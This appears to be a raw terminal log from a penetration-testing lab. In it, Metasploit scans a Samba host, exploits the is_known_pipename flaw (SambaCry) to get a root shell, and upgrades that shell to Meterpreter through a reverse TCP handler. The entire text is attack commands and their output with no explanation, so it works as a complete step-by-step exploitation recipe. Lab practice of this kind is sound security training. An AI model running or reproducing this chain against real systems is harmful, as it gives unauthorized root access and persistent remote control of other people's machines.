```
root@attackdefense:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.5  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:05  txqueuelen 0  (Ethernet)
        RX packets 146  bytes 12228 (11.9 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 123  bytes 314298 (306.9 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.189.173.2  netmask 255.255.255.0  broadcast 192.189.173.255
        ether 02:42:c0:bd:ad:02  txqueuelen 0  (Ethernet)
        RX packets 18  bytes 1516 (1.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 18  bytes 1656 (1.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 18  bytes 1656 (1.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@attackdefense:~# ping -c 5 192.189.173.3
PING 192.189.173.3 (192.189.173.3) 56(84) bytes of data.
64 bytes from 192.189.173.3: icmp_seq=1 ttl=64 time=0.094 ms
64 bytes from 192.189.173.3: icmp_seq=2 ttl=64 time=0.037 ms
64 bytes from 192.189.173.3: icmp_seq=3 ttl=64 time=0.037 ms
64 bytes from 192.189.173.3: icmp_seq=4 ttl=64 time=0.034 ms
64 bytes from 192.189.173.3: icmp_seq=5 ttl=64 time=0.030 ms

--- 192.189.173.3 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 84ms
rtt min/avg/max/mdev = 0.030/0.046/0.094/0.024 ms
root@attackdefense:~# service postgresql start 
[ ok ] Starting PostgreSQL 11 database server: main.
root@attackdefense:~# msfconsole
                                                  
IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt


       =[ metasploit v5.0.18-dev                          ]
+ -- --=[ 1882 exploits - 1062 auxiliary - 328 post       ]
+ -- --=[ 546 payloads - 44 encoders - 10 nops            ]
+ -- --=[ 2 evasion                                       ]

msf5 > workspace -a upgrade_meter
[*] Added workspace: upgrade_meter
[*] Workspace: upgrade_meter
msf5 > setg RHOSTS 192.189.173.3
RHOSTS => 192.189.173.3
msf5 > db_nmap -sV -O 192.189.173.3
[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2023-08-04 11:37 UTC
[*] Nmap: Nmap scan report for target-1 (192.189.173.3)
[*] Nmap: Host is up (0.000028s latency).
[*] Nmap: Not shown: 998 closed ports
[*] Nmap: PORT    STATE SERVICE     VERSION
[*] Nmap: 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
[*] Nmap: 445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
[*] Nmap: MAC Address: 02:42:C0:BD:AD:03 (Unknown)
[*] Nmap: No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
[*] Nmap: TCP/IP fingerprint:
[*] Nmap: OS:SCAN(V=7.70%E=4%D=8/4%OT=139%CT=1%CU=34913%PV=N%DS=1%DC=D%G=Y%M=0242C0%T
[*] Nmap: OS:M=64CCE305%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%
[*] Nmap: OS:TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5
[*] Nmap: OS:=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=
[*] Nmap: OS:FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%
[*] Nmap: OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
[*] Nmap: OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S
[*] Nmap: OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
[*] Nmap: OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
[*] Nmap: OS:%T=40%CD=S)
[*] Nmap: Network Distance: 1 hop
[*] Nmap: Service Info: Host: VICTIM-1
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 23.09 seconds
```

```
msf5 > search type:exploit name:samba

Matching Modules
================

   #   Name                                         Disclosure Date  Rank       Check  Description
   -   ----                                         ---------------  ----       -----  -----------
   1   exploit/freebsd/samba/trans2open             2003-04-07       great      No     Samba trans2open Overflow (*BSD x86)
   2   exploit/linux/samba/chain_reply              2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)
   3   exploit/linux/samba/is_known_pipename        2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load
   4   exploit/linux/samba/lsa_transnames_heap      2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow
   5   exploit/linux/samba/setinfopolicy_heap       2012-04-10       normal     Yes    Samba SetInformationPolicy AuditEventsInfo Heap Overflow
   6   exploit/linux/samba/trans2open               2003-04-07       great      No     Samba trans2open Overflow (Linux x86)
   7   exploit/multi/samba/nttrans                  2003-04-07       average    No     Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow
   8   exploit/multi/samba/usermap_script           2007-05-14       excellent  No     Samba "username map script" Command Execution
   9   exploit/osx/samba/lsa_transnames_heap        2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
   10  exploit/osx/samba/trans2open                 2003-04-07       great      No     Samba trans2open Overflow (Mac OS X PPC)
   11  exploit/solaris/samba/lsa_transnames_heap    2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
   12  exploit/solaris/samba/trans2open             2003-04-07       great      No     Samba trans2open Overflow (Solaris SPARC)
   13  exploit/windows/http/sambar6_search_results  2003-06-21       normal     Yes    Sambar 6 Search Results Buffer Overflow


msf5 > use exploit/linux/samba/is_known_pipename
msf5 exploit(linux/samba/is_known_pipename) > options
\
Module options (exploit/linux/samba/is_known_pipename):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   RHOSTS          192.189.173.3    yes       The target address range or CIDR identifier
   RPORT           445              yes       The SMB service port (TCP)
   SMB_FOLDER                       no        The directory to use within the writeable SMB share
   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Interact)


msf5 exploit(linux/samba/is_known_pipename) > run

[*] 192.189.173.3:445 - Using location \\192.189.173.3\exploitable\tmp for the path
[*] 192.189.173.3:445 - Retrieving the remote path of the share 'exploitable'
[*] 192.189.173.3:445 - Share 'exploitable' has server-side path '/
[*] 192.189.173.3:445 - Uploaded payload to \\192.189.173.3\exploitable\tmp\LdReHjpH.so
[*] 192.189.173.3:445 - Loading the payload from server-side path /tmp/LdReHjpH.so using \\PIPE\/tmp/LdReHjpH.so...
[-] 192.189.173.3:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] 192.189.173.3:445 - Loading the payload from server-side path /tmp/LdReHjpH.so using /tmp/LdReHjpH.so...
[+] 192.189.173.3:445 - Probe response indicates the interactive payload was loaded...
[*] Found shell.
[*] Command shell session 1 opened (192.189.173.2:39125 -> 192.189.173.3:445) at 2023-08-04 11:47:01 +0000

ls
sysinfo
/bin/sh: 4: sysinfo: not found
whoami
root
/bin/bash -i
bash: cannot set terminal process group (8): Inappropriate ioctl for device
bash: no job control in this shell
root@victim-1:/tmp# ls
ls
root@victim-1:/tmp# 
root@victim-1:/tmp# ^Z
Background session 1? [y/N]  y
msf5 exploit(linux/samba/is_known_pipename) > sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               192.189.173.2:39125 -> 192.189.173.3:445 (192.189.173.3)

msf5 exploit(linux/samba/is_known_pipename) > search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   1  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


msf5 exploit(linux/samba/is_known_pipename) > use post/multi/manage/shell_to_meterpreter
msf5 post(multi/manage/shell_to_meterpreter) > options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on.

msf5 post(multi/manage/shell_to_meterpreter) > set lhost eth1
lhost => 192.189.173.2
msf5 post(multi/manage/shell_to_meterpreter) > set session 1
session => 1
msf5 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.189.173.2:4433 
[*] Sending stage (985320 bytes) to 192.189.173.3
[*] Meterpreter session 2 opened (192.189.173.2:4433 -> 192.189.173.3:53900) at 2023-08-04 11:49:53 +0000
[*] Command stager progress: 100.00% (773/773 bytes)
[*] Post module execution completed
msf5 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                   Connection
  --  ----  ----                   -----------                                   ----------
  1         shell cmd/unix                                                       192.189.173.2:39125 -> 192.189.173.3:445 (192.189.173.3)
  2         meterpreter x86/linux  uid=0, gid=0, euid=0, egid=0 @ 192.189.173.3  192.189.173.2:4433 -> 192.189.173.3:53900 (192.189.173.3)

msf5 post(multi/manage/shell_to_meterpreter) > sessions 2
[*] Starting interaction with 2...

meterpreter > sysinfo
Computer     : 192.189.173.3
OS           : Debian 8.11 (Linux 5.4.0-152-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > whoami
[-] Unknown command: whoami.
meterpreter > getuid
Server username: uid=0, gid=0, euid=0, egid=0
meterpreter >
```

```
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 192.189.173.3 - Meterpreter session 2 closed.  Reason: User exit
msf5 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               192.189.173.2:39125 -> 192.189.173.3:445 (192.189.173.3)

msf5 post(multi/manage/shell_to_meterpreter) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.189.173.2:4433 
[*] Sending stage (985320 bytes) to 192.189.173.3
[*] Meterpreter session 3 opened (192.189.173.2:4433 -> 192.189.173.3:33930) at 2023-08-04 11:51:29 +0000
[*] Command stager progress: 100.00% (773/773 bytes)
msf5 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                   Connection
  --  ----  ----                   -----------                                   ----------
  1         shell cmd/unix                                                       192.189.173.2:39125 -> 192.189.173.3:445 (192.189.173.3)
  3         meterpreter x86/linux  uid=0, gid=0, euid=0, egid=0 @ 192.189.173.3  192.189.173.2:4433 -> 192.189.173.3:33930 (192.189.173.3)

msf5 post(multi/manage/shell_to_meterpreter) > sessions 3
[*] Starting interaction with 3...

meterpreter > sysinfo
Computer     : 192.189.173.3
OS           : Debian 8.11 (Linux 5.4.0-152-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > getuid
Server username: uid=0, gid=0, euid=0, egid=0
meterpreter > 
```

